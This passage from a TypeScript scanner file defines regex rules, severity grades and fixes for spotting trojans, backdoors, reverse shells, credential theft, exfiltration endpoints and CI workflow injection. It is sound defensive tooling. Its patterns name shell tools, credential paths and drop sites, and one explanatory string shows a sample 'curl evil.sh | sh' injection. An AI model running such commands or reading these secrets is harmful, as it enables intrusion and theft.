// veyra-guard-ignore-file: this file defines the detection rules, so it contains the patterns it looks for.
// The Veyra Code Guard scanner: reads code line by line and reports signs of trojans, backdoors and other
// malicious code. Pure TypeScript with no dependencies, shared by the VS Code extension, the GitHub Action and the CLI.

export type Severity = "critical" | "high" | "medium" | "low";
export const SEVERITIES: Severity[] = ["critical", "high", "medium", "low"];
export const severityRank = (s: Severity) => SEVERITIES.length - SEVERITIES.indexOf(s); // critical 4 … low 1

export interface Finding {
  rule: string;
  title: string;
  severity: Severity;
  line: number;       // 1-based
  column: number;     // 1-based
  endColumn: number;  // 1-based, exclusive
  message: string;    // what was found on this line
  why: string;        // why it matters, in plain words
  fix: string;        // what to do about it
  snippet: string;    // the matched text, made visible (hidden characters shown as <U+202E>)
}

/** What to do about each kind of finding. */
export const FIXES: Record<string, string> = {
  "trojan-source": "Delete the hidden characters (Code Guard's quick fix does it), then re-read the line as it really is. If you didn't add them, treat the change as hostile and find out where it came from.",
  "invisible-character": "Remove the invisible characters, then check the names on the line: a variable with a hidden character is a different variable from the one it looks like.",
  "homoglyph": "Retype the name using plain Latin letters, then search the code for both spellings to see whether a look-alike function was defined somewhere.",
  "hidden-far-right": "Scroll right to read the hidden code, then move it to its own line or remove it. Nothing legitimate needs hundreds of spaces before it.",
  "eval-decoded": "Decode the string and read what it really does. Replace eval/Function with ordinary code; if the code came from someone else, treat it as malicious until proven otherwise.",
  "packed-code": "Unpack it (for example with a JavaScript beautifier) to see what it does, and replace it with the readable source. Don't ship packed code you can't read.",
  "python-exec": "Decode what is being executed and replace exec()/__import__ with normal imports and calls. Hidden execution has no place in reviewed code.",
  "download-execute": "Download to a file, check its checksum or signature, review it, then run it, or pin a specific version through your package manager instead.",
  "reverse-shell": "Remove it and assume the machine that ran it may be compromised: rotate credentials and check for other changes by the same author.",
  "crypto-miner": "Remove the miner and check where it came from (a dependency, a pull request, a build script). Rotate any credentials on machines that ran it.",
  "credential-theft": "Code should never read keys, wallets or browser data it wasn't built for. Remove it; if it ran, rotate the affected keys and passwords.",
  "exfil-endpoint": "Find out what is being sent and why. Remove the endpoint unless it is your own, documented integration, and keep webhook URLs out of source code.",
  "env-exfil": "Read only the variables you need, by name (process.env.API_URL), and never send the whole environment anywhere.",
  "persistence": "Remove the start-up entry unless installing a service is the program's documented purpose, and check machines that ran it for the entry it created.",
  "disable-defences": "Remove it. Software should never turn off antivirus, the firewall or logging; if it ran, re-enable the protections and investigate.",
  "hidden-powershell": "Decode the command and replace it with a readable script. Visible, signed scripts are the norm; hidden encoded ones are a red flag.",
  "insecure-tls": "Keep certificate checks on. For a private certificate authority, trust that authority explicitly (NODE_EXTRA_CA_CERTS, verify='ca.pem') instead of turning checks off.",
  "char-code-obfuscation": "Convert the character codes back to text to see what they spell, and write it as a normal string.",
  "hex-escapes": "Decode the escapes to see what they hide. If it's data, move it to a file; if it's code, rewrite it readably.",
  "base64-blob": "Decode it and check what it is. Move legitimate assets (images, fonts) into files; remove anything executable.",
  "raw-ip-url": "Use your service's domain name, ideally over https. If the address is unknown to you, find out who added it and why.",
  "secret": "Revoke the key with its provider now (deleting it from the code isn't enough: it stays in history), then load the new one from an environment variable or secret store.",
  "install-script": "Remove the install script, or replace it with a reviewed local script. If the package isn't yours, don't install it.",
  "install-hook": "Read the script it runs. If it's needed (building native code), keep it; otherwise remove it, and consider installing with --ignore-scripts.",
  "workflow-injection": "Pass the value through an environment variable (env: TITLE: ${{ github.event.issue.title }}) and use \"$TITLE\" in the script, so it is treated as text, not code.",
  "workflow-pr-target": "Use the pull_request event for building pull requests, or don't check out the pull request's code in pull_request_target jobs.",
  "typosquat-package": "Check the name letter by letter. If you meant the popular package, fix the name, remove the look-alike and its lockfile entry, and rotate any secrets on machines that installed it.",
  "remote-dependency": "Install from the registry with a pinned version, or pin the git dependency to an exact commit you have reviewed.",
  "dependency-confusion": "Use a single index that proxies the public one (--index-url), reserve your private names publicly, and always use https.",
  "unpinned-dependency": "Pin a version range you have reviewed (for example ^4.18.2) and commit the lockfile.",
  "guard-opt-out": "Make sure each opt-out has a reason in the comment and was agreed in review.",
};

/** A 0-100 score and A-F grade for a set of findings: one critical finding caps the grade at D. */
export function grade(findings: Finding[]) {
  const c = summarize(findings);
  const score = Math.max(0, 100 - (c.critical * 30 + c.high * 12 + c.medium * 4 + c.low));
  const letter = c.critical ? (score >= 40 ? "D" : "F") : c.high ? (score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F") : score >= 90 ? "A" : score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";
  const verdict = c.critical ? "Action needed: critical findings" : c.high ? "Review needed: high-risk findings" : c.medium ? "Mostly clean: a few things to check" : c.low ? "Clean: minor notes only" : "Clean: no signs of malicious code";
  return { score, letter, verdict, counts: c };
}

interface Rule {
  id: string;
  title: string;
  severity: Severity;
  why: string;
  /** Regular expression run on every line (flags: g is added). */
  pattern?: RegExp;
  /** Only run on files whose path matches. */
  files?: RegExp;
  /** Skip files whose path matches. */
  skipFiles?: RegExp;
  /** Extra test a pattern match must pass to count (lines are 0-based here). */
  accept?: (match: string, lines: string[], index: number) => boolean;
  /** Custom check for a whole file; returns findings without rule metadata. */
  check?: (lines: string[], path: string) => Array<{ line: number; column: number; length: number; message: string }>;
  message?: (match: string) => string;
}

const MINIFIED = /\.min\.(js|css|mjs)$|[-.]bundle\.js$|(^|\/)(dist|bundle|build|out|vendor)\//i;
const LOCKFILES = /(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb|Cargo\.lock|poetry\.lock|Gemfile\.lock|composer\.lock|go\.sum)$/i;
const DOCS = /\.(md|markdown|txt|rst|adoc)$/i;

/** Hidden characters, shown visibly so a reviewer can see them. */
export const visible = (text: string) => text.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u00ad\u061c\u115f\u1160\u17b4\u17b5\u180e\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\u3164\ufe00-\ufe0f\ufeff\uffa0]/g,
  c => `<U+${c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")}>`);

const RULES: Rule[] = [
  // ---- Hidden characters and look-alikes (the "Trojan Source" family) ----
  {
    id: "trojan-source", title: "Trojan Source: hidden text-direction characters", severity: "critical",
    pattern: /[\u202a-\u202e\u2066-\u2069]/,
    why: "Bidirectional control characters (CVE-2021-42574) make code display differently from how it runs, so a reviewer sees safe code while the compiler sees something else. They have no place in source code.",
    message: m => `Hidden text-direction character ${visible(m)} on this line.`,
  },
  {
    id: "invisible-character", title: "Invisible character in code", severity: "high",
    pattern: /[\u200b-\u200d\u2060-\u2064\u180e\u3164\u115f\u1160\uffa0\u00ad]/,
    skipFiles: DOCS,
    why: "Zero-width and blank characters can hide extra code or create look-alike names (two variables that look identical but aren't), a known way to sneak in backdoors.",
    message: m => `Invisible character ${visible(m)} on this line.`,
  },
  {
    id: "homoglyph", title: "Look-alike letters in an identifier", severity: "high",
    skipFiles: /\.(md|markdown|txt|rst|po|pot|json|ya?ml|html?|xml|csv|properties|strings|resx|arb|xlf)$/i,
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      // A word that mixes Latin letters with Cyrillic or Greek ones (e.g. "p\u0430ypal" with a Cyrillic \u0430), outside strings and comments.
      const word = /[A-Za-z_$\u0370-\u03ff\u0400-\u04ff][\w$\u0370-\u03ff\u0400-\u04ff]*/g;
      lines.forEach((raw, i) => {
        const line = stripStringsAndComments(raw);
        for (const m of line.matchAll(word)) {
          const w = m[0];
          if (/[A-Za-z]/.test(w) && /[\u0370-\u03ff\u0400-\u04ff]/.test(w)) out.push({ line: i + 1, column: m.index! + 1, length: w.length, message: `"${w}" mixes Latin with Cyrillic or Greek letters.` });
        }
      });
      return out;
    },
    why: "Letters from other alphabets that look identical to Latin ones (Cyrillic \u0430 vs Latin a) let an attacker define a function that looks like a trusted one but is a different, malicious one.",
  },
  {
    id: "hidden-far-right", title: "Code hidden far off to the right", severity: "high",
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(svg|json|map|csv|tsv|txt|md|xml|html?)$`, "i"),
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /^(.*?\S)?([ \t]{120,})(\S.*)$/.exec(line);
        if (m) out.push({ line: i + 1, column: (m[1]?.length ?? 0) + m[2].length + 1, length: m[3].length, message: `${m[2].length} spaces push this code out of view: ${truncate(m[3], 80)}` });
      });
      return out;
    },
    why: "Pushing code hundreds of columns to the right hides it from anyone reading the file without scrolling, a trick used to hide malicious calls in plain sight.",
  },

  // ---- Running hidden or downloaded code ----
  {
    id: "eval-decoded", title: "Running decoded or obfuscated code", severity: "critical",
    pattern: /\b(?:eval|Function|exec|execSync|setTimeout|setInterval|vm\.run\w*|runInNewContext|execScript|Invoke-Expression|iex)\s*\(?\s*(?:new\s+Function\s*\()?[^;\n]{0,40}?\b(?:atob|unescape|decodeURIComponent|fromCharCode|b64decode|base64\.decode|decodebytes|Buffer\.from\s*\([^)]*['"](?:base64|hex)['"]|FromBase64String|zlib\.(?:inflate|gunzip)\w*|codecs\.decode|bytes\.fromhex|rot13|marshal\.loads|decompress)/i,
    why: "Decoding a hidden string and then executing it is the classic way malware hides its real behaviour from reviewers and scanners. Legitimate code almost never needs this.",
    message: m => `Decodes and runs hidden code: ${truncate(m, 80)}`,
  },
  {
    id: "packed-code", title: "Packed (obfuscated) JavaScript", severity: "critical",
    pattern: /eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)/,
    why: "This is the signature of a JavaScript packer, which scrambles code so nobody can read what it does. It is common in injected malware.",
    message: () => "JavaScript packed with eval(function(p,a,c,k,e,d)).",
  },
  {
    id: "python-exec", title: "Python running hidden or dynamic code", severity: "critical",
    pattern: /\bexec\s*\(\s*(?:compile\s*\(|__import__|(?:base64|zlib|marshal|codecs|binascii)\.)|__import__\s*\(\s*['"](?:os|subprocess|socket|pty|ctypes)['"]\s*\)\s*\.\s*(?:system|popen|call|Popen|spawn|check_output)/,
    files: /\.(py|pyw|ipynb|pyx)$/i,
    why: "exec() of compiled or decoded data, or __import__('os').system(...), is how Python malware hides commands from readers and simple scanners.",
    message: m => `Hidden command execution: ${truncate(m, 80)}`,
  },
  {
    id: "download-execute", title: "Downloads and runs a program", severity: "critical",
    pattern: /\b(?:curl|wget|fetch)\b[^|;\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\b(?:curl|wget)\b[^|;\n]*\|\s*(?:python[23]?|perl|ruby|node)\b|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient|DownloadString|DownloadFile)\b[^\n]{0,120}\b(?:iex|Invoke-Expression|Start-Process)\b|\b(?:iex|Invoke-Expression)\b[^\n]{0,60}\b(?:Net\.WebClient|DownloadString|DownloadData|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b|\bcertutil(?:\.exe)?\s+(?:-|\/)urlcache\b|\bmshta(?:\.exe)?\s+["']?https?:|\bbitsadmin(?:\.exe)?\s+\/transfer\b|\bregsvr32(?:\.exe)?\s+[^\n]*\/i:https?:|\brundll32(?:\.exe)?\s+[^\n]*javascript:/i,
    skipFiles: DOCS,
    why: "Piping a downloaded file straight into a shell runs whatever the server sends, with no review. Attackers use exactly this to install backdoors through build and install scripts.",
    message: m => `Downloads and executes code: ${truncate(m, 80)}`,
  },
  {
    id: "reverse-shell", title: "Reverse shell (remote control backdoor)", severity: "critical",
    pattern: /\/dev\/(?:tcp|udp)\/[\w.-]+\/\d+|\b(?:nc|ncat|netcat)\b[^\n]{0,60}\s-(?:e|c)\s|\b(?:bash|sh|zsh)\s+-i\s*>?&|\bpty\.spawn\s*\(\s*['"]\/bin\/(?:ba)?sh|\bsocket\.socket\b[^\n]{0,200}\b(?:dup2|subprocess|pty)\b|\bos\.dup2\s*\(\s*\w+\.fileno\(\)\s*,\s*[012]\s*\)|\bmkfifo\b[^\n]{0,80}\b(?:nc|ncat|netcat)\b|New-Object\s+(?:System\.)?Net\.Sockets\.TCPClient/i,
    why: "A reverse shell connects out to an attacker's server and hands them a command line on the machine running this code: full remote control.",
    message: m => `Opens a remote shell: ${truncate(m, 80)}`,
  },
  {
    id: "crypto-miner", title: "Cryptocurrency miner", severity: "critical",
    pattern: /stratum\+(?:tcp|ssl|tls):\/\/|\bxmrig\b|\bcoinhive\b|\bcryptonight\b|\b(?:minexmr|nanopool|supportxmr|moneroocean|nicehash|f2pool|2miners)\.(?:com|org|net)\b|\bcpuminer\b|\bethminer\b/i,
    why: "Hidden miners steal CPU and electricity from whoever runs the code to earn cryptocurrency for the attacker. They are one of the most common payloads in poisoned packages.",
    message: m => `Cryptocurrency mining reference: ${truncate(m, 60)}`,
  },

  // ---- Stealing data ----
  {
    id: "credential-theft", title: "Reads stored passwords, keys or wallets", severity: "high",
    pattern: /\.ssh[\\/](?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys)|\.aws[\\/]credentials|\.npmrc\b|\.pypirc\b|\.git-credentials|\.docker[\\/]config\.json|\.kube[\\/]config|\/etc\/(?:shadow|sudoers)\b|Login Data\b|Local State\b|\bCookies\b[^\n]{0,40}(?:Chrome|Edge|Brave|Firefox)|(?:Chrome|Edge|Brave)[^\n]{0,60}\b(?:Login Data|Cookies|Web Data)\b|\bwallet\.dat\b|\bkeychain-db\b|\bExodus[\\/]exodus\.wallet|\bMetaMask\b[^\n]{0,60}(?:Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn)|discord[\\/]Local Storage/i,
    skipFiles: new RegExp(`${DOCS.source}|(^|/)\\.gitignore$|(^|/)\\.dockerignore$|(^|/)\\.npmignore$`, "i"),
    // Mentioning a path (a .gitignore entry, a list of files to protect) is fine; reading, copying or sending it nearby is not.
    accept: (_m, lines, i) => lines.slice(Math.max(0, i - 2), i + 3).some(l => READS.test(l)),
    why: "Malicious packages commonly read SSH keys, cloud credentials, npm tokens, browser password stores and crypto wallets, then send them to the attacker.",
    message: m => `Reads sensitive credentials: ${truncate(m, 60)}`,
  },
  {
    id: "exfil-endpoint", title: "Sends data to a drop point used by attackers", severity: "high",
    pattern: /discord(?:app)?\.com\/api\/webhooks\/|api\.telegram\.org\/bot|\bhooks\.slack\.com\/services\/|\bwebhook\.site\/|\b(?:requestbin|pipedream)\.(?:net|com)\b|\b[\w-]+\.(?:ngrok(?:-free)?\.(?:io|app)|oast\.(?:fun|me|pro|live|site|online)|burpcollaborator\.net|interact\.sh|requestcatcher\.com|canarytokens\.com)\b|\bpastebin\.com\/(?:api|raw)\b|\btransfer\.sh\b|\bfile\.io\b|\banonfiles\.com\b/i,
    skipFiles: DOCS,
    why: "Webhooks, chat bots, tunnels and paste sites are favourite places for stolen data to be sent, because they need no server of the attacker's own.",
    message: m => `Sends data to ${truncate(m, 60)}`,
  },
  {
    id: "env-exfil", title: "Collects all environment variables", severity: "high",
    pattern: /JSON\.stringify\s*\(\s*process\.env\s*\)|\bObject\.(?:entries|keys|values)\s*\(\s*process\.env\s*\)[^\n]{0,80}(?:fetch|https?\.request|axios|post|send|write)|\b(?:dict\s*\(\s*os\.environ\s*\)|json\.dumps\s*\(\s*(?:dict\s*\()?\s*os\.environ)|\bGet-ChildItem\s+env:[^\n]{0,80}(?:Invoke-WebRequest|iwr|Invoke-RestMethod)|\bprintenv\b[^\n]{0,40}\|\s*(?:curl|wget|nc)\b|\benv\b\s*\|\s*(?:curl|wget|nc)\b/i,
    why: "Environment variables hold API keys, tokens and passwords. Bundling all of them up, rather than reading one named setting, is the tell-tale step before sending them away.",
    message: m => `Collects every environment variable: ${truncate(m, 60)}`,
  },

  // ---- Persistence, defence evasion, privilege ----
  {
    id: "persistence", title: "Installs itself to run again later", severity: "high",
    pattern: /\bcrontab\s+(?:-l\b[^\n]{0,40}\||-\s*$|[^\n]*<<)|\(\s*crontab\s+-l|\bschtasks(?:\.exe)?\s+\/create\b|\\(?:CurrentVersion)\\Run(?:Once)?\b|\bHKCU:?\\[^\n]*\\Run\b|\bLaunchAgents\/[^\n]*\.plist|>>\s*~?\/?(?:\$HOME\/|~\/)?\.(?:bashrc|zshrc|profile|bash_profile)\b|\bsystemctl\s+enable\b[^\n]{0,60}--now|\bNew-ScheduledTask\w*|\bRegister-ScheduledTask\b|\/etc\/rc\.local\b|\bStartup\\[^\n]*\.(?:lnk|bat|vbs|exe)\b/i,
    skipFiles: DOCS,
    why: "Adding itself to cron, scheduled tasks, startup folders, the registry Run key or shell start-up files lets malware survive reboots and keep running.",
    message: m => `Sets up automatic start-up: ${truncate(m, 70)}`,
  },
  {
    id: "disable-defences", title: "Turns off security protections", severity: "critical",
    pattern: /\bSet-MpPreference\b[^\n]*-Disable\w*\s+\$?true|\bAdd-MpPreference\b[^\n]*-Exclusion\w*|\bnetsh\s+(?:adv)?firewall\s+set\s+[^\n]*state\s+off|\bsetenforce\s+0\b|\bufw\s+disable\b|\bsystemctl\s+(?:stop|disable)\s+(?:firewalld|apparmor|auditd)|\bspctl\s+--master-disable\b|\bcsrutil\s+disable\b|\bwevtutil\s+cl\b|\bClear-EventLog\b|\bhistory\s+-c\b[^\n]*&&|\bunset\s+HISTFILE\b/i,
    skipFiles: DOCS,
    why: "Disabling antivirus, the firewall or audit logging, or wiping logs and shell history, is what malware does to avoid being caught. Normal software has no reason to.",
    message: m => `Disables security or erases traces: ${truncate(m, 70)}`,
  },
  {
    id: "hidden-powershell", title: "Hidden or encoded PowerShell", severity: "critical",
    pattern: /\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,80}\s-(?:e|en|enc|enco|encod|encode|encoded|encodedc\w*)\s+[A-Za-z0-9+/=]{20,}|\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,120}-(?:w|win|window|windowstyle)\s+h(?:idden)?\b[^\n]{0,120}-(?:nop|noprofile|ep|exec\w*\s+bypass)|\[(?:System\.)?Convert\]::FromBase64String\([^)]*\)[^\n]{0,80}(?:iex|Invoke-Expression|\.Invoke\(|Assembly\]::Load)/i,
    why: "Encoded commands and hidden PowerShell windows are used to run instructions the user can't see or read, a hallmark of Windows malware droppers.",
    message: m => `Hidden PowerShell command: ${truncate(m, 70)}`,
  },
  {
    id: "insecure-tls", title: "Turns off HTTPS certificate checks", severity: "medium",
    pattern: /NODE_TLS_REJECT_UNAUTHORIZED\s*[=:]\s*['"]?0|rejectUnauthorized\s*:\s*false|\bverify\s*=\s*False\b|InsecureSkipVerify\s*:\s*true|ServerCertificateValidationCallback\s*=\s*\{?\s*(?:\([^)]*\)|\w+)\s*=>\s*true|\bcurl\b[^\n]*\s(?:-k|--insecure)\b|\bwget\b[^\n]*--no-check-certificate/i,
    skipFiles: DOCS,
    why: "Without certificate checks, anyone on the network can intercept and change the traffic, including swapping a downloaded file for malware.",
    message: m => `Certificate checks disabled: ${truncate(m, 60)}`,
  },

  // ---- Obfuscation signals ----
  {
    id: "char-code-obfuscation", title: "Text built from character codes", severity: "high",
    pattern: /String\.fromCharCode\s*\(\s*(?:\d{2,3}\s*[,)]\s*){12,}|\bchr\s*\(\s*\d{2,3}\s*\)(?:\s*\+\s*chr\s*\(\s*\d{2,3}\s*\)){10,}|\[char\]\s*\d{2,3}(?:\s*\+\s*\[char\]\s*\d{2,3}){10,}/i,
    skipFiles: MINIFIED,
    why: "Spelling out text one character code at a time hides words like URLs and commands from people and from text searches. It is a common obfuscation step.",
    message: () => "Long string assembled from character codes.",
  },
  {
    id: "hex-escapes", title: "Long hex-escaped string", severity: "medium",
    pattern: /(?:\\x[0-9a-fA-F]{2}){24,}|(?:\\u00[0-9a-fA-F]{2}){24,}/,
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(json|map|svg)$`, "i"),
    why: "A long run of \\x escapes usually hides readable text or machine code. Check what it decodes to.",
    message: m => `Hex-escaped data (${Math.round(m.length / 4)} bytes).`,
  },
  {
    id: "base64-blob", title: "Large encoded blob in source code", severity: "medium",
    pattern: /['"`][A-Za-z0-9+/]{300,}={0,2}['"`]/,
    skipFiles: new RegExp(`${MINIFIED.source}|${LOCKFILES.source}|\\.(json|map|svg|css|scss|less|html?|md|txt|pem|crt|cer|xml|ipynb|snap)$`, "i"),
    why: "Large base64 strings in code can be harmless (an embedded image or font), but they are also how payloads are smuggled past reviewers. Check what it decodes to.",
    message: m => `Encoded blob of ${m.length - 2} characters.`,
  },
  {
    id: "raw-ip-url", title: "Connects to a bare IP address", severity: "medium",
    pattern: /\b(?:https?|ftp|wss?|tcp):\/\/(?!(?:127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|localhost))(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/i,
    skipFiles: new RegExp(`${DOCS.source}|${LOCKFILES.source}`, "i"),
    why: "Real services use domain names. A hard-coded public IP address often points at an attacker's server, chosen so it doesn't show up in DNS logs.",
    message: m => `Hard-coded server address ${m}`,
  },

  // ---- Leaked secrets ----
  {
    id: "secret", title: "Secret key or token in the code", severity: "high",
    pattern: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b|\bgh[pousr]_[A-Za-z0-9]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{60,}\b|-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----|\bxox[baprs]-[A-Za-z0-9-]{10,}\b|\bsk_live_[A-Za-z0-9]{20,}\b|\brk_live_[A-Za-z0-9]{20,}\b|\bAIza[0-9A-Za-z_-]{35}\b|\bglpat-[A-Za-z0-9_-]{20,}\b|\bnpm_[A-Za-z0-9]{36}\b|\bsk-(?:proj-|ant-)?[A-Za-z0-9_-]{32,}\b|\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/,
    skipFiles: LOCKFILES,
    accept: (m, lines, i) => {
      // A private key header only counts with key data after it; a header on its own is just a string.
      if (m.startsWith("-----BEGIN")) return /^[A-Za-z0-9+/=]{40,}\s*$/.test((lines[i + 1] ?? "").trim()) || /-----\s*\\n[A-Za-z0-9+/=]{40,}/.test(lines[i]);
      return !FAKE_SECRET.test(m) && longestRun(m) < 8 && entropy(m.replace(/^(?:AKIA|ASIA|gh[pousr]_|github_pat_|xox[baprs]-|sk_live_|rk_live_|AIza|glpat-|npm_|sk-(?:proj-|ant-)?|SG\.)/, "")) >= 3.2;
    },
    why: "Keys committed to code can be copied by anyone who can read the repository, including from its history after deletion. Revoke the key and load it from a secret store instead.",
    message: m => `Possible secret: ${m.slice(0, 6)}… (${m.length} characters). Revoke it if it's real.`,
  },

  // ---- Package and pipeline hijacking ----
  {
    id: "install-script", title: "Install script that runs on npm install", severity: "critical",
    files: /(^|\/)package\.json$/i,
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /"(preinstall|install|postinstall|preuninstall|postuninstall|prepare|prepublish)"\s*:\s*"([^"]*)"/.exec(line);
        if (!m) return;
        const [, hook, cmd] = m;
        if (/\b(curl|wget|powershell|pwsh|iwr|Invoke-WebRequest|bash\s+-c|sh\s+-c|node\s+-e|python\s+-c|eval|base64|https?:\/\/|\|\s*(?:ba)?sh)\b/i.test(cmd))
          out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${hook}" runs a download or inline code on install: ${truncate(cmd, 80)}` });
      });
      return out;
    },
    why: "npm runs install scripts automatically on every machine that installs the package, including CI servers. Most supply-chain attacks start here.",
  },
  {
    id: "install-hook", title: "Runs code automatically on npm install", severity: "low",
    files: /(^|\/)package\.json$/i,
    check: lines => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /"(preinstall|install|postinstall)"\s*:\s*"([^"]*)"/.exec(line);
        if (m && !/\b(curl|wget|powershell|pwsh|iwr|Invoke-WebRequest|bash\s+-c|sh\s+-c|node\s+-e|python\s+-c|eval|base64|https?:\/\/)\b/i.test(m[2]))
          out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${m[1]}" runs "${truncate(m[2], 60)}" on every install. Check that script.` });
      });
      return out;
    },
    why: "Install hooks run without anyone asking. They are often legitimate (building native code), but they are worth a look in every new dependency.",
  },
  {
    id: "workflow-injection", title: "GitHub workflow runs untrusted text as a command", severity: "high",
    files: /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i,
    pattern: /\$\{\{\s*github\.(?:event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label)|comment\.body|review\.body|review_comment\.body|pages\.\S*\.page_name|commits\.\S*\.(?:message|author\.(?:name|email))|head_commit\.(?:message|author\.(?:name|email))|discussion\.(?:title|body)|workflow_run\.head_branch)|head_ref)\s*\}\}/,
    why: "Anyone who can open an issue or pull request controls this text. Put straight into a run: step, a title like `\"; curl evil.sh | sh #` runs as a command on your CI with your secrets. Pass it through an environment variable instead.",
    message: m => `Untrusted value in a workflow: ${m}`,
  },
  {
    id: "workflow-pr-target", title: "pull_request_target checks out untrusted code", severity: "critical",
    files: /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i,
    check: (lines) => {
      const text = lines.join("\n");
      if (!/\bpull_request_target\b/.test(text)) return [];
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        if (/ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)|ref:\s*refs\/pull\/|github\.head_ref/.test(line))
          out.push({ line: i + 1, column: line.search(/\S/) + 1, length: line.trim().length, message: "Checks out the pull request's own code in a pull_request_target workflow, which has write access and secrets." });
      });
      return out;
    },
    why: "pull_request_target runs with your repository's secrets and write access. Checking out and running the pull request's code there lets any outsider's pull request steal those secrets.",
  },

  // ---- Supply chain: the packages a project pulls in ----
  {
    id: "typosquat-package", title: "Package name one letter away from a popular one", severity: "high",
    files: /(^|\/)(package\.json|requirements[\w.-]*\.txt|Pipfile|pyproject\.toml)$/i,
    check: (lines, path) => {
      const python = !/package\.json$/i.test(path);
      const popular = python ? POPULAR_PYPI : POPULAR_NPM;
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      const npmDeps = python ? undefined : dependencyLines(lines);
      lines.forEach((line, i) => {
        if (npmDeps && !npmDeps.has(i)) return;
        const name = dependencyName(line, path);
        if (!name) return;
        const lower = name.toLowerCase().replace(/_/g, "-");
        if (popular.has(lower) || REAL_NEIGHBOURS.has(lower)) return;
        const near = [...popular].find(p => p.length >= 4 && Math.abs(p.length - lower.length) <= 1 && editDistance(p, lower) === 1);
        if (near) out.push({ line: i + 1, column: line.indexOf(name) + 1, length: name.length, message: `"${name}" is one letter away from the popular package "${near}".` });
      });
      return out;
    },
    why: "Attackers publish packages with names one typo away from popular ones (expres, reqeusts) so a slip of the keyboard installs their malware. It is one of the most common supply-chain attacks.",
  },
  {
    id: "remote-dependency", title: "Dependency installed from a URL or git, not the registry", severity: "medium",
    files: /(^|\/)(package\.json|requirements[\w.-]*\.txt)$/i,
    check: (lines, path) => {
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      const npm = /package\.json$/i.test(path), deps = npm ? dependencyLines(lines) : undefined;
      lines.forEach((line, i) => {
        if (deps && !deps.has(i)) return;
        const m = npm ? /"([@\w./-]+)"\s*:\s*"((?:https?:|git\+|git:|github:|gitlab:|bitbucket:)[^"]*)"/.exec(line) : /^\s*((?:git\+|https?:)\S+)/.exec(line);
        if (m) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `${npm ? `"${m[1]}" comes` : "This package comes"} from ${truncate(npm ? m[2] : m[1], 70)} instead of the package registry.` });
      });
      return out;
    },
    why: "Code fetched from a URL or a git repository skips the registry's checks and can change at any time without a new version, so what you reviewed may not be what gets installed.",
  },
  {
    id: "dependency-confusion", title: "Extra package source that can be hijacked", severity: "high",
    files: /(^|\/)(requirements[\w.-]*\.txt|pip\.conf|\.npmrc|\.yarnrc(\.yml)?)$/i,
    pattern: /--extra-index-url\s+\S+|--index-url\s+http:\/\/\S+|--trusted-host\s+\S+|^\s*registry\s*=\s*http:\/\/\S+|npmRegistryServer:\s*["']?http:\/\/\S+|^\s*always-auth\s*=\s*false/im,
    why: "With an extra package index, pip installs whichever source has the higher version, so an attacker can publish a public package with your private package's name and get it installed (dependency confusion). Plain http sources can be tampered with in transit.",
    message: m => `Package source: ${truncate(m, 70)}`,
  },
  {
    id: "unpinned-dependency", title: "Dependency with no version limit", severity: "low",
    files: /(^|\/)package\.json$/i,
    check: lines => {
      const deps = dependencyLines(lines);
      const out: ReturnType<NonNullable<Rule["check"]>> = [];
      lines.forEach((line, i) => {
        const m = /"([@\w./-]+)"\s*:\s*"(\*|latest|x|)"/.exec(line);
        if (m && deps.has(i)) out.push({ line: i + 1, column: m.index + 1, length: m[0].length, message: `"${m[1]}" has no version limit ("${m[2]}").` });
      });
      return out;
    },
    why: "\"*\" or \"latest\" installs whatever version is newest on the day, including a malicious one published by a hijacked account. Pin a version range you have reviewed.",
  },
];

// The most installed packages, for spotting look-alike names. Names that are popular in their own right aren't flagged.
